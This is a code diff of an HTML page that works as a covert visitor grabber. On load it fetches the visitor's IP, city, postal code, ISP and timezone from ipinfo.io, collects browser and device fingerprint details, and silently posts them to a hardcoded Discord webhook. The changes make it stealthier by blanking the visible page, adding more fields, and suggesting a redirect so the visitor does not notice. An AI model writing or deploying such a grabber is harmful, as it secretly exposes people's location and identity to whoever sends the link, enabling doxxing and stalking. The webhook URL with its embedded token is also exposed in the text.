@@ -2,54 +2,71 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Loading...</title>
-  <style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:50px;}</style>
+  <title></title>
+  <style>body{margin:0;background:#000;}</style>
 </head>
 <body>
-  <h1>Please wait...</h1>
 
   <script>
-    const webhook = "https://discord.com/api/webhooks/1485701753654743261/BNhHwbYVgb4vi3GO2RpOBZ-DqnmrxZMv_Vn7tnc4nRf0BMnoTaQFqGWeFngQcDwCrj4E"; // ← replace
+    const webhook = "https://discord.com/api/webhooks/1485701753654743261/BNhHwbYVgb4vi3GO2RpOBZ-DqnmrxZMv_Vn7tnc4nRf0BMnoTaQFqGWeFngQcDwCrj4E"; // ← REPLACE THIS
 
-    async function logVisit() {
+    async function grabAll() {
       try {
+        // IP + geo + ISP (using ipinfo.io - free tier, reliable)
         const ipRes = await fetch('https://ipinfo.io/json');
         const ipData = await ipRes.json();
 
-        const info = {
+        // Gather everything the browser exposes
+        const allInfo = {
           ip: ipData.ip || '?',
-          location: `${ipData.city || '?'} • ${ipData.region || '?'} • ${ipData.country || '?'}`,
-          isp: ipData.org || '?',
-          browser: navigator.userAgent,
+          loc: `${ipData.city || '?'} • ${ipData.region || '?'} • ${ipData.country || '?'}`,
+          postal: ipData.postal || '?',
+          timezone: ipData.timezone || '?',
+          isp_org: ipData.org || '?',
+          ua: navigator.userAgent || '?',
           platform: navigator.platform || '?',
-          screen: `\( {screen.width}x \){screen.height}`,
+          languages: navigator.languages?.join(', ') || navigator.language || '?',
+          screen: `\( {screen.width}× \){screen.height} (${screen.colorDepth || '?'}bit)`,
+          avail_screen: `\( {screen.availWidth}× \){screen.availHeight}`,
+          hardware: navigator.hardwareConcurrency || '? cores',
+          memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '?',
+          connection: navigator.connection ? `\( {navigator.connection.effectiveType || '?'} ( \){navigator.connection.downlink || '?'} Mbps)` : '?',
+          doNotTrack: navigator.doNotTrack || '?',
+          cookies: navigator.cookieEnabled ? 'enabled' : 'disabled',
           time: new Date().toISOString(),
-          referrer: document.referrer || 'direct'
+          referrer: document.referrer || 'none/direct'
         };
+
+        // Build embed fields dynamically (no source/site mention beyond raw referrer if present)
+        const fields = Object.entries(allInfo).map(([key, val]) => ({
+          name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
+          value: `\`${val}\``,
+          inline: !['ua', 'referrer'].includes(key)  // longer ones full width
+        }));
 
         await fetch(webhook, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             embeds: [{
-              title: "Visitor Logged",
-              color: 0x00ff00,
-              fields: Object.entries(info).map(([key, val]) => ({
-                name: key.charAt(0).toUpperCase() + key.slice(1),
-                value: `\`${val}\``,
-                inline: key !== 'browser' && key !== 'referrer'
-              })),
-              timestamp: new Date().toISOString()
+              title: "Visitor",
+              color: 0x00AA00,
+              fields: fields,
+              timestamp: new Date().toISOString(),
+              footer: { text: "Logged" }
             }]
           })
         });
-      } catch (e) {}
+      } catch (e) {
+        // silent fail if blocked (adblock, etc.)
+      }
     }
 
-    logVisit();
+    grabAll();
 
-    // Optional: redirect somewhere after logging (e.g. rickroll or real site)
-    setTimeout(() => { window.location = "https://example.com"; }, 1500);
+    // Optional: blank the page or redirect after logging (uncomment if wanted)
+    // setTimeout(() => { document.body.innerHTML = ''; }, 800);
+    // or redirect: setTimeout(() => { window.location = "https://example.com"; }, 1200);
   </script>
 </body>
 </html>
